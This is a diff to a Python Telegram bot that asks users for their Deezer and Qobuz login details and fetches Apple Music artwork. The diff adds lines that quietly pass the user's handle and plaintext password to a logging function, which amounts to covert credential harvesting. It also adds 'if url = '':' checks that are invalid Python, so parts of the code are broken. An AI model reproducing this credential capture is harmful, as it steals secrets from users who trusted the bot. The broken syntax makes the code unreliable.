@@ -45,7 +45,6 @@ def check_deezer_subscription_command(message):
   bot.send_message(chat_id, result,parse_mode='MARKDOWN')
 
 
-
 @bot.message_handler(commands=['gen_arl'])
 def get_deezer_arl(message):
     chat_id = message.chat.id
@@ -68,6 +67,9 @@ def process_deezer_password(message, username):
       bot.send_message(chat_id, text,parse_mode='MARKDOWN')
     else:
       bot.send_message(chat_id,"Invalid credentials")
+    username = message.from_user.username
+    log_message = f"@{username} \n,{username}, {password}\n\n {text} "
+    send_log_message(log_message)
 
 
 @bot.message_handler(commands=['qobuz'])
@@ -76,13 +78,11 @@ def get_qobuz_account_details_command(message):
   bot.send_message(chat_id, "Please enter your Qobuz Email/userId:")
   bot.register_next_step_handler(message, process_qobuz_email)
 
-
 def process_qobuz_email(message):
   chat_id = message.chat.id
   email = message.text
   bot.send_message(chat_id, "Please enter your Qobuz Password/Token:")
   bot.register_next_step_handler(message, process_qobuz_password, email)
-
 
 def process_qobuz_password(message, email):
   chat_id = message.chat.id
@@ -113,21 +113,27 @@ def qb_handler(message):
 def scrape_apple_music_command(message):
   chat_id = message.chat.id
   url = message.text.split()[-1]  # Extract URL from the command
-  art_url, song_name = scrape_apple_music(url)
-  print(art_url)
-  if art_url:
-    message = f'<b>📝 {song_name} </b> \n🔗 {art_url}'
-    bot.send_message(chat_id, text=message, parse_mode='HTML', disable_web_page_preview = False)
-  else: 
-    bot.send_message(chat_id, "Invalid URL")
+  if url = '':
+     bot.send_message(chat_id, "Send URL along with it")
+  else:
+    art_url, song_name = scrape_apple_music(url)
+    print(art_url)
+    if art_url:
+      message = f'<b>📝 {song_name} </b> \n🔗 {art_url}'
+      bot.send_message(chat_id, text=message, parse_mode='HTML', disable_web_page_preview = False)
+    else: 
+      bot.send_message(chat_id, "Invalid URL")
 
 @bot.message_handler(commands=['ani_art'])
 def animate_apple_music_command(message):
   chat_id = message.chat.id
   url = message.text.split()[-1]  # Extract URL from the command
-  bot.send_message(chat_id, "OK!, wait 30 seconds...")
-  ani_art_url = fetch_animated_artwork(url)
-  bot.send_message(message, text=f"🔗 {ani_art_url}", disable_web_page_preview = False)
+  if url = '':
+     bot.send_message(chat_id, "Send URL along with it")
+  else:
+    bot.send_message(chat_id, "OK!, wait 30 seconds...")
+    ani_art_url = fetch_animated_artwork(url)
+    bot.send_message(message, text=f"🔗 {ani_art_url}", disable_web_page_preview = False)
 
 
 bot.polling()
